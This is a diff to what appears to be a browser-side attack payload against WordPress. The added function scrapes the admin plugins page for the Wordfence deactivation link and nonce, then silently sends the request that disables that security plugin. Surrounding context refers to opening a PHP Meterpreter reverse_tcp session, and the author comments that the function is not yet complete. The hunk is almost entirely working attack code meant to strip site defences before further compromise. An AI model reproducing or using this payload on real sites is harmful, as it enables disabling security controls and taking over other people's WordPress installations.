@@ -564,6 +564,62 @@ async function openPhpMeterpreterSession()
 
 
 
+// This needs more work, not quite there
+// The initial link is off a bit, plus it needs
+// to follow a redirect to complete the action. 
+function deactivateWordFence()
+{
+	console.log("Starting to deactivate wordfence...");
+
+	// http://192.168.78.157/wp-admin/plugins.php?action=deactivate&plugin=wordfence%2Fwordfence.php&plugin_status=all&paged=1&s&_wpnonce=25ff958dd9
+
+	// <a href="plugins.php?action=deactivate&amp;plugin=wordfence%2Fwordfence.php&amp;plugin_status=all&amp;paged=1&amp;s&amp;_wpnonce=25ff958dd9
+
+	// We'll append to this later once we figure
+	// out the link (with nonce) to deactivate
+	// the wordfence plugin
+	var uri = "/wp-admin/plugins.php";
+
+	xhr = new XMLHttpRequest();
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+	xhr.onreadystatechange = function()
+	{
+		// Ok, we have our request, let's find the 
+		// link for deactivating the 
+		if (xhr.readyState == XMLHttpRequest.DONE)
+		{
+			var response = read_body(xhr);
+			var linkPos  = response.indexOf('<a href="plugins.php?action=deactivate&amp;plugin=wordfence%2Fwordfence.php');
+			
+			// Note that the nonce index is from the start of the linkPos, 
+			// not it's absolute position in the response
+			var noncePos = response.substring(linkPos).indexOf('_wpnonce=');
+
+			console.log("Link pos: " + linkPos);
+			console.log("Nonce pos: " + noncePos);
+			var link = response.substring(linkPos, linkPos + noncePos + 19);
+			console.log("Link is: " + link);
+
+			link = link.replace('<a href="plugins.php', "");
+
+			// Ok, tack this onto our uri to get the full link
+			uri += link;
+			console.log("URI is now: " + uri);
+
+			// Now that we have the correct link (with nonce as GET param)
+			// we can deactivate wordfence security plugin
+			deactivateXhr = new XMLHttpRequest();
+			deactivateXhr.open("GET", uri, true);
+			deactivateXhr.send(null);
+
+			console.log("Done deactivating wordfence");
+		}
+	}
+}
+
+
 
 
 // handy
@@ -661,4 +717,3 @@ function writeFile()
 // multi/handler
 // payload is php/meterpreter/reverse_tcp
 //openPhpMeterpreterSession();
-
